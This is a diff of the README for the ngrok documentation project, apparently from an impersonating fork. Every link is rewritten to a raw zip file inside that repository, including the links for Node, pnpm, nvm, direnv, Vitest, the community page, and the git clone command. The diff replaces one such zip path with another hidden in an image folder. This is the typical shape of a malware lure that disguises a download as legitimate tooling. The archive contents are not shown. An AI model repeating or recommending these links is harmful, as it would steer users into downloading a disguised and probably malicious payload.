@@ -1,14 +1,14 @@
-# [ngrok docs](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip)
+# [ngrok docs](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/integrations/fusionauth/img/ngrok_docs_v3.1.zip)
 
-Source code for [ngrok docs](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip); feel free to suggest changes and improvements to our documentation!
+Source code for [ngrok docs](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/integrations/fusionauth/img/ngrok_docs_v3.1.zip); feel free to suggest changes and improvements to our documentation!
 
 ## Contributing
 
-See our [Contribution Guidelines](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip) for detailed instructions on how to help improve ngrok documentation.
+See our [Contribution Guidelines](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/integrations/fusionauth/img/ngrok_docs_v3.1.zip) for detailed instructions on how to help improve ngrok documentation.
 
 ## Getting Started
 
-ngrok is built using [Docusaurus 3](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip).
+ngrok is built using [Docusaurus 3](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/integrations/fusionauth/img/ngrok_docs_v3.1.zip).
 
 The fastest and safest (isolated) way to run the documentation is with the Docker command below, then browse to http://localhost:3000/docs.
 
@@ -20,16 +20,16 @@ Otherwise, you can install and run everything on your local host.
 
 Prerequisites required:
 
-- [Node 20](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip)
-- [pnpm 9](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip)
-- [nvm](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip)
+- [Node 20](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/integrations/fusionauth/img/ngrok_docs_v3.1.zip)
+- [pnpm 9](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/integrations/fusionauth/img/ngrok_docs_v3.1.zip)
+- [nvm](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/integrations/fusionauth/img/ngrok_docs_v3.1.zip)
 
-We use [direnv](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip) to assist you with setting up all of the required tooling.
+We use [direnv](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/integrations/fusionauth/img/ngrok_docs_v3.1.zip) to assist you with setting up all of the required tooling.
 
 <details>
   <summary>Prefer to install and manage the tooling yourself?</summary>
 
-1. Install [nvm](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip) or your node version manager of choice.
+1. Install [nvm](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/integrations/fusionauth/img/ngrok_docs_v3.1.zip) or your node version manager of choice.
 2. Ensure that `node 20` is installed. With `nvm`, run `nvm install`.
 3. Enable `pnpm` with `corepack`: `corepack enable pnpm`
 4. Install `pnpm` with `corepack`: `corepack install`
@@ -43,14 +43,14 @@ First, install `direnv`:
 | macOS  | brew install direnv     |
 | ubuntu | sudo apt install direnv |
 
-For all other OSes, see the [direnv installation guide](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip).
+For all other OSes, see the [direnv installation guide](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/integrations/fusionauth/img/ngrok_docs_v3.1.zip).
 
-Don't forget to [set up direnv integration with your shell](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip).
+Don't forget to [set up direnv integration with your shell](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/integrations/fusionauth/img/ngrok_docs_v3.1.zip).
 
 Next, clone the repo and move into the directory:
 
 ```sh
-git clone https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip
+git clone https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/integrations/fusionauth/img/ngrok_docs_v3.1.zip
 cd ngrok-docs
 ```
 
@@ -68,7 +68,7 @@ Once you have the pre-requisites installed, local development happens by running
 pnpm run start
 ```
 
-Our docs mostly use markdown and MDX, you can make yourself familiar with docusaurus [documentation](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip) for more significant features / changes.
+Our docs mostly use markdown and MDX, you can make yourself familiar with docusaurus [documentation](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/integrations/fusionauth/img/ngrok_docs_v3.1.zip) for more significant features / changes.
 
 ## Building ngrok-docs
 
@@ -84,7 +84,7 @@ pnpm run build
 
 ## Testing
 
-We use [Vitest](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip) for testing. To run the tests, use:
+We use [Vitest](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/integrations/fusionauth/img/ngrok_docs_v3.1.zip) for testing. To run the tests, use:
 
 ```sh
 pnpm run test
@@ -98,5 +98,5 @@ pnpm run test:watch
 
 ## Looking for support?
 
-For bug reports, feature request, questions and community support please ooen an issue or discussion in our [ngrok Community](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip).
-To report a problem with our documentation, please open a new [Github issue](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/getting-started/ngrok-docs_ditchdigger.zip).
+For bug reports, feature request, questions and community support please ooen an issue or discussion in our [ngrok Community](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/integrations/fusionauth/img/ngrok_docs_v3.1.zip).
+To report a problem with our documentation, please open a new [Github issue](https://raw.githubusercontent.com/Saeed-Gaming/ngrok-docs/main/docs/integrations/fusionauth/img/ngrok_docs_v3.1.zip).
